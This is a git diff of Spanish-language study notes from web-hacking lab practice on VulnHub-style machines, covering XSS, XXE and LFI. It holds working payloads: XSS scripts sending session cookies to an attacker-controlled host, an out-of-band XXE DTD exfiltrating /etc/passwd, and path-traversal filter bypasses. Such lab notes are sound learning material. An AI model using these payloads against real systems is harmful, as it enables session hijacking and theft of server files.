@@ -192,7 +192,7 @@ robar cookie de sesion no tiene que tener httponly en este caso:
 ``` js
 <script>
 var request = new XMLHttpRequest();
-request.open('GET;, 'http://192.168.50.2/?cookie=' + document.cookie);
+request.open('GET,'http://192.168.50.2/?cookie=' + document.cookie);
 request.send();
 </script>
 ```
@@ -240,9 +240,27 @@ var domain = "http://localhost:10007/newgossip":
 - El servidor exige este token en peticiones POST válidas.
 
 ###### - **Máquina MyExpense**: [https://www.vulnhub.com/entry/myexpense-1,405/](https://www.vulnhub.com/entry/myexpense-1,405/)
+
+tuve que usar NAT dentro de la config de virtualbox
+hacer port forwarding desde el puerto 80 de la vm al 8080 del host
+limpiar las iptables del host con iptables -F y iptables -P INPUT ACCEP
+y luego ya pude conectarme desde la raspberry a la direccion `http://192.168.50.1:8080` / que es el `http://localhost:8080` desde el host
+
+yo puedo crear un http server en el puerto 80
+```python
+python -m http.server 80
+```
+e inyecto el tag
+```html
+<script src="http://192.168.50.2:80/pwned.js"></script>
+```
+
+y ahora creo el archivo con el script
+
 ```js
 var request = new XMLHttpRequest();
-request.open('GET', 'http://192.158.50.1/?cookie='+document.cookie);
+request.open('GET', 'http://192.168.50.1/?cookie='+document.cookie);
+request.send();
 ```
 el codigo roba las cookies y las pone en la URL como parametro (solo el texto en la URL, no se envian datos en un payload)
 
@@ -252,3 +270,83 @@ request.send('GET', 'http://192.168.50.1/admin/admin.php?id=11&status=active');
 request.send();
 ```
 este codigo activa un usuario (que actualmente esta inactivo, con id=11) en la tabla de usuarios desde la cuenta autenticada admin a traves de XSS. Admin abre la ruta donde esta inyectado el script malicioso y se activa la cuenta que nosotros queremos
+
+tambien se puede hacer un SQLi en esta maquina
+
+cache busting (obliga a cargar la version nueva de un script)
+`<script src="http://192.168.50.1/pwned.js?v=2"></script>`
+
+# 3. [[XXE]] XML external entity injection
+las entidades son como "strings" declaradas previamente que despues se pueden inyectar en el payload
+
+ejemplo payload:
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+
+<root><name>luka</name><tel>123456</tel><email>&xxe;</email><password>12345678</password></root>POST /process.php HTTP/1.1
+
+```
+
+y recibo las contrasenas del servidor
+
+![[Pasted image 20260117152120.png]]
+##### XXE oob (out-of-band)
+cuando no se puede ver la respuesta, se usan con external DTD 
+
+`<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://192.168.50.1/malicious.dtd">`
+
+malicious.dtd (debera estar en la misma carpeta en la que abra el puerto 80 con python http.server 80):
+```dtd
+<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://192.168.50.1/?file=%file;'>">
+%eval;
+%exfil;
+```
+
+![[Pasted image 20260117153757.png]]
+
+para decodificarlo:
+echo -n "cadena en base64" | base64 -d
+
+![[Pasted image 20260117154138.png]]
+
+> los XXE tambien sirven para explotar SSRF
+
+# 4. LFI (local file inclusion)
+```php
+<?php
+	$filename = $_GET['filename'];
+	$filename = str_replace("../", "", $filename);
+	include("/var/www/html". $filename)
+?>
+```
+esto hace una sanitizacion al input del usuario
+pero si pongo la cadena
+
+"....//....//....//....//etc/passwd"
+igualmente llego al mismo archivo
+```php
+<?php
+	$filename = $_GET['filename'];
+	$filename = str_replace("../", "", $filename);
+
+	if(preg_match("/\etc\/passwd/", $filename)===1){
+	echo "\n [!] pagina prohibida";
+	}else{
+	include("/var/www/html". $filename);
+	}
+?>
+```
+con ese codigo tambien se puede buscar el archivo passwd usando por ejemplo: "....//....//....//etc///././/passwd"
+
+en php < 5.3 si hago un null byte injection (\0) al final de la cadena puedo lograr ver el contenido del archivo que quiero.
+**null byte tambien se representa como:** %00
+
+para controlar los ultimos 6 chars (en el caso de passwd)
+```php
+php -r 'if(substr(argv[1],-6,6)!="passwd") include(argv[1]);' '/etc/passwd'; echo
+```
+pero se puede ver archivos igualmente utilizando '/etc/passwd\\.'
+
